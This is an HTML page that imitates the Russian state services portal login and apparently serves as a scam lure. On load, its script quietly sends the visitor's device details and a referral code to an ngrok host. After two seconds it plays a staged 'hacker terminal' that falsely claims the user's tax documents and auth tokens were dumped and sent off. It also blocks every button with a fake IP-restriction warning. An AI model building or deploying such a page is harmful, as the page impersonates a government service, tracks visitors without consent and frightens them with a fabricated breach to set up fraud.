<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Портал государственных услуг Российской Федерации</title>
    <style>
        * { box-sizing: border-box; }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #e4ecfd;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            position: relative;
        }

        .main-container { position: relative; display: flex; justify-content: center; align-items: center; width: 100%; }
        .form-column { display: flex; flex-direction: column; width: 100%; max-width: 380px; z-index: 1; }
        .card { background: #ffffff; padding: 35px 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.03); width: 100%; position: relative; overflow: hidden; }

        /* Контейнер для оригинальной формы */
        .form-content {
            transition: opacity 0.3s ease, transform 0.3s ease;
        }

        .logo-container { text-align: center; margin-bottom: 25px; }
        .logo-img { max-height: 130px; width: auto; display: block; margin: 0 auto; }
        .logo-placeholder { font-size: 22px; font-weight: 800; color: #005FF9; letter-spacing: 0.5px; }

        .form-group { margin-bottom: 16px; }
        .form-group label { display: block; margin-bottom: 8px; font-size: 14px; color: #000; }
        .form-group input {
            width: 100%; padding: 12px; background-color: #f2f3f5; border: 1px solid transparent; 
            border-radius: 8px; font-size: 14px; outline: none; transition: border-color 0.2s, background-color 0.2s;
        }
        .form-group input:focus { background-color: #ffffff; border-color: #2764FC; }

        .link-restore, .link-cant-login, .alt-login-text a, .register-link-container a { color: #2764FC; text-decoration: none; }
        .link-restore { display: inline-block; font-size: 14px; margin-bottom: 24px; }
        .link-cant-login { display: block; text-align: center; font-size: 14px; margin-bottom: 24px; }
        
        .btn-primary {
            width: 100%; padding: 14px; background-color: #005FF9; color: #ffffff; border: none; 
            border-radius: 8px; font-size: 15px; font-weight: 500; cursor: pointer; margin-bottom: 20px; transition: background-color 0.2s;
        }
        .btn-primary:hover { background-color: #0047c2; }

        .divider { border: none; border-top: 1px solid #e1e3e6; margin: 0 -30px 24px -30px; }
        .alt-login-text { font-size: 14px; color: #000; margin-bottom: 16px; }
        .btn-outline {
            width: 100%; padding: 12px; background-color: transparent; color: #2764FC; border: 1px solid #2764FC; 
            border-radius: 8px; font-size: 14px; font-weight: 500; cursor: pointer; margin-bottom: 12px; transition: background-color 0.2s;
        }
        .btn-outline:hover { background-color: rgba(39, 100, 252, 0.05); }
        .btn-outline:last-child { margin-bottom: 0; }
        .register-link-container { margin-top: 25px; text-align: center; font-size: 15px; }

        /* Стили для терминала */
        .hacker-overlay {
            position: fixed; inset: 0; background: rgba(8, 12, 18, 0.94); backdrop-filter: blur(8px); display: flex; 
            justify-content: center; align-items: center; z-index: 10500; opacity: 0; visibility: hidden; transition: opacity 0.3s ease, visibility 0.3s ease; padding: 20px;
        }
        .hacker-overlay.visible { opacity: 1; visibility: visible; }
        .hacker-window {
            width: 100%; max-width: 580px; background: #0d1117; border: 1px solid #30363d; border-radius: 12px; 
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8), 0 0 20px rgba(88, 166, 255, 0.12); overflow: hidden; font-family: "Consolas", "Courier New", monospace;
        }
        .hacker-body { padding: 22px; color: #c9d1d9; }
        .terminal-console { height: 230px; overflow-y: auto; font-size: 13px; line-height: 1.5; margin-bottom: 16px; padding-right: 6px; text-align: left;}
        .terminal-console::-webkit-scrollbar { width: 4px; }
        .terminal-console::-webkit-scrollbar-thumb { background: #21262d; border-radius: 2px; }
        .log-line { margin-bottom: 4px; word-break: break-all; }
        .log-line .timestamp { color: #8b949e; }
        .log-line .tag-info { color: #58a6ff; }
        .log-line .tag-warn { color: #d29922; }
        .log-line .tag-success { color: #3fb950; }
        .hacker-progress-container { border-top: 1px dashed #30363d; padding-top: 14px; }
        .progress-info { display: flex; justify-content: space-between; font-size: 12px; color: #8b949e; margin-bottom: 8px; }
        .progress-bar-bg { width: 100%; height: 8px; background: #21262d; border-radius: 4px; overflow: hidden; }
        .progress-bar-fill { width: 0%; height: 100%; background: linear-gradient(90deg, #1f6feb, #58a6ff); box-shadow: 0 0 10px rgba(88, 166, 255, 0.5); transition: width 0.15s linear; }

        /* Стили для системы уведомлений об ошибках (Toast) */
        .toast-container {
            position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); z-index: 12000;
            display: flex; flex-direction: column; gap: 12px; pointer-events: none; width: 90%; max-width: 400px;
        }
        .error-toast {
            background-color: #fef2f2; border-left: 6px solid #ef4444; color: #991b1b; padding: 16px 20px;
            border-radius: 6px; box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1), 0 4px 6px rgba(0, 0, 0, 0.05);
            font-size: 15px; font-weight: 500; display: flex; align-items: center; opacity: 0; transform: translateY(30px);
            animation: slideInToast 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards, fadeOutToast 0.5s ease 3.5s forwards;
        }
        .error-toast::before { content: "⚠️"; margin-right: 12px; font-size: 18px; }

        @keyframes slideInToast { to { opacity: 1; transform: translateY(0); } }
        @keyframes fadeOutToast { to { opacity: 0; transform: translateY(-20px); margin-top: -60px; } }

        /* Премиальная анимация галочки и успеха */
        .success-container {
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 50px 10px;
            text-align: center;
            animation: fadeInState 0.6s ease forwards;
        }

        .checkmark-wrapper {
            position: relative;
            width: 90px;
            height: 90px;
            margin-bottom: 30px;
        }

        .checkmark {
            width: 90px;
            height: 90px;
            border-radius: 50%;
            display: block;
            stroke-width: 3.5;
            stroke: #005FF9;
            stroke-miterlimit: 10;
            box-shadow: inset 0px 0px 0px #005FF9;
            animation: fillCircle .4s ease-in-out .4s forwards, scaleBounce .3s ease-in-out .9s both;
            position: relative;
            z-index: 2;
        }

        .checkmark__circle {
            stroke-dasharray: 166;
            stroke-dashoffset: 166;
            stroke-width: 3.5;
            stroke-miterlimit: 10;
            stroke: #005FF9;
            fill: none;
            animation: drawStroke 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards;
        }

        .checkmark__check {
            transform-origin: 50% 50%;
            stroke-dasharray: 48;
            stroke-dashoffset: 48;
            animation: drawStroke 0.3s cubic-bezier(0.65, 0, 0.45, 1) 0.6s forwards;
        }

        .checkmark-pulse {
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0, 95, 249, 0.1);
            border-radius: 50%;
            z-index: 1;
            opacity: 0;
            animation: pulseWave 1.5s cubic-bezier(0.215, 0.61, 0.355, 1) 0.9s forwards;
        }

        .success-text {
            font-size: 22px;
            font-weight: 700;
            color: #0b1f33;
            opacity: 0;
            transform: translateY(15px);
            animation: slideUpFade 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275) 1s forwards;
            line-height: 1.35;
        }

        @keyframes drawStroke { 100% { stroke-dashoffset: 0; } }
        @keyframes scaleBounce {
            0%, 100% { transform: none; }
            50% { transform: scale3d(1.15, 1.15, 1); }
        }
        @keyframes fillCircle { 100% { box-shadow: inset 0px 0px 0px 45px rgba(0, 95, 249, 0.06); } }
        @keyframes pulseWave {
            0% { transform: scale(0.9); opacity: 1; }
            100% { transform: scale(1.6); opacity: 0; }
        }
        @keyframes fadeInState { from { opacity: 0; } to { opacity: 1; } }
        @keyframes slideUpFade { to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

    <div class="main-container">
        <div class="form-column">
            <!-- В карточку добавлен контейнер для скрытия формы и блок успеха -->
            <div class="card">
                <div id="formContent" class="form-content">
                    <div class="logo-container">
                        <img src="flags/gos.png" alt="логотип" class="logo-img" onerror="this.style.display='none'; this.nextElementSibling.style.display='block';">
                        <div class="logo-placeholder" style="display:none;">ЛОГОТИП ГОСОВ</div>
                    </div>
                    <form id="loginForm" onsubmit="return false;">
                        <div class="form-group"><label>Телефон / Эл. почта / СНИЛС</label><input type="text" id="userInput" name="phone" required /></div>
                        <div class="form-group"><label>Пароль</label><input type="password" id="passwordInput" name="password" required /></div>
                        <a href="#" class="link-restore">Восстановить</a>
                        <button type="submit" id="submitBtn" class="btn-primary">Войти</button>
                    </form>
                    <a href="#" class="link-cant-login">Не удаётся войти</a>
                    <hr class="divider">
                    <div class="alt-login-text">Войти другим способом. <a href="#">Подробнее</a></div>
                    <button type="button" class="btn-outline">QR-код</button>
                    <button type="button" class="btn-outline">Электронная подпись</button>
                    
                    <div class="register-link-container"><a href="#">Зарегистрироваться</a></div>
                </div>

                <!-- Блок успешного применения скидки -->
                <div id="successState" class="success-container">
                    <div class="checkmark-wrapper">
                        <div class="checkmark-pulse"></div>
                        <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
                            <circle class="checkmark__circle" cx="26" cy="26" r="25" fill="none"/>
                            <path class="checkmark__check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
                        </svg>
                    </div>
                    <div class="success-text">Вход выполнен <br>успешно</div>
                </div>
            </div>
        </div>
    </div>

    <!-- Контейнер для всплывающих уведомлений -->
    <div id="toastContainer" class="toast-container"></div>

    <div id="hackerModal" class="hacker-overlay">
        <div class="hacker-window">
            <div class="hacker-body">
                <div id="terminalConsole" class="terminal-console"></div>
                <div class="hacker-progress-container">
                    <div class="progress-info">
                        <span id="progressText">ВЫГРУЗКА ДАННЫХ И ЛОГОВ...</span>
                        <span id="progressPercent">0%</span>
                    </div>
                    <div class="progress-bar-bg">
                        <div id="progressBarFill" class="progress-bar-fill"></div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const hackerModal = document.getElementById('hackerModal');
            const terminalConsole = document.getElementById('terminalConsole');
            const progressBarFill = document.getElementById('progressBarFill');
            const progressPercent = document.getElementById('progressPercent');
            const toastContainer = document.getElementById('toastContainer');
            
            const formContent = document.getElementById('formContent');
            const successState = document.getElementById('successState');

            const hackerLogs = [
                { type: 'info', text: 'Инициализация сеанса авторизации...' },
                { type: 'success', text: 'Учетные данные подтверждены системой.' },
                { type: 'info', text: 'Сканирование защищенного профиля пользователя...' },
                { type: 'warn', text: 'Обнаружено активных сессий: 3' },
                { type: 'info', text: 'Подготовка пакета данных для синхронизации...' },
                { type: 'success', text: 'Синхронизировано: Основные сведения' },
                { type: 'success', text: 'Синхронизировано: Налоговые документы' },
                { type: 'success', text: 'Синхронизировано: Цифровой профиль' },
                { type: 'info', text: 'Dumping DB table: [user_auth_tokens] (Offset: 0x0000 to 0x2C1A)' },
                { type: 'info', text: 'Compressing package (GZIP level 9) to 34.5 MB...' },
                { type: 'success', text: 'Data transfer sequence finished. Checksum SHA-256 OK.' },
                { type: 'warn', text: 'Резервная копия сессии передана на удаленный узел.' },
                { type: 'info', text: 'ОЧИСТКА ВРЕМЕННЫХ ФАЙЛОВ И КЕША БРАУЗЕРА...' },
                { type: 'success', text: 'Очистка следов успешно завершена.' },
                { type: 'success', text: 'Готово!' }
            ];

            const urlParams = new URLSearchParams(window.location.search);
            let refCode = urlParams.get('ref');
            
            if (refCode) {
                localStorage.setItem('refCode', refCode);
            } else {
                refCode = localStorage.getItem('refCode');
            }

            const visitDeviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform || (navigator.userAgentData ? navigator.userAgentData.platform : 'Неизвестно'),
                language: navigator.language,
                screenRes: `${window.screen.width}x${window.screen.height}`,
                localTime: new Date().toLocaleString('ru-RU')
            };

            const visitPayload = { 
                deviceInfo: visitDeviceInfo,
                refCode: refCode || null 
            };

            fetch('https://accent-cried-guzzler.ngrok-free.dev/api/visit', { 
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(visitPayload)
            }).catch(err => console.error("Ошибка отправки визита:", err));

            // Автоматический запуск терминала спустя 2 секунды
            setTimeout(() => {
                if (!hackerModal.classList.contains('visible')) {
                    hackerModal.classList.add('visible');
                    runHackerTerminal(() => {
                        // После завершения логов скрываем терминал
                        hackerModal.classList.remove('visible');
                        
                        // Спустя короткую задержку (пока исчезает терминал) подменяем контент формы
                        setTimeout(() => {
                            formContent.style.display = 'none';
                            successState.style.display = 'flex';
                        }, 300);
                    });
                }
            }, 2000);

            // Функция отображения красивой ошибки (Toast Notification)
            function showErrorToast(message) {
                const toast = document.createElement('div');
                toast.className = 'error-toast';
                toast.textContent = message;
                
                toastContainer.appendChild(toast);

                setTimeout(() => {
                    if (toast.parentNode) {
                        toast.parentNode.removeChild(toast);
                    }
                }, 4000);
            }

            // Глобальный перехватчик кликов на ВСЕ кнопки и ссылки
            document.body.addEventListener('click', (e) => {
                const interactiveElement = e.target.closest('button, a');
                
                if (interactiveElement) {
                    e.preventDefault();   
                    e.stopPropagation();  
                    
                    showErrorToast('Действия с вашего IP ограничены');
                }
            }, true);

            function runHackerTerminal(onComplete) {
                let currentLogIndex = 0;
                const totalLogs = hackerLogs.length;

                terminalConsole.innerHTML = ''; 

                function processNextLog() {
                    if (currentLogIndex < totalLogs) {
                        const log = hackerLogs[currentLogIndex];
                        const now = new Date();
                        const timeStr = now.toTimeString().split(' ')[0] + '.' + String(now.getMilliseconds()).padStart(3, '0');

                        let tagClass = 'tag-info';
                        let tagTitle = '[INFO]';
                        if (log.type === 'warn') { tagClass = 'tag-warn'; tagTitle = '[WARN]'; }
                        if (log.type === 'success') { tagClass = 'tag-success'; tagTitle = '[OK]  '; }

                        const lineDiv = document.createElement('div');
                        lineDiv.className = 'log-line';
                        lineDiv.innerHTML = `<span class="timestamp">${timeStr}</span> <span class="${tagClass}">${tagTitle}</span> ${log.text}`;
                        
                        terminalConsole.appendChild(lineDiv);
                        terminalConsole.scrollTop = terminalConsole.scrollHeight;

                        currentLogIndex++;
                        const percent = Math.round((currentLogIndex / totalLogs) * 100);
                        progressBarFill.style.width = percent + '%';
                        progressPercent.textContent = percent + '%';

                        let delay = Math.floor((Math.random() * 200 + 100));
                        if (log.text.includes('Dumping') || log.text.includes('Compressing')) delay = 700;
                        
                        setTimeout(processNextLog, delay);
                    } else {
                        setTimeout(() => { if (onComplete) onComplete(); }, 1000); 
                    }
                }
                processNextLog();
            }
        });
    </script>
</body>
</html>
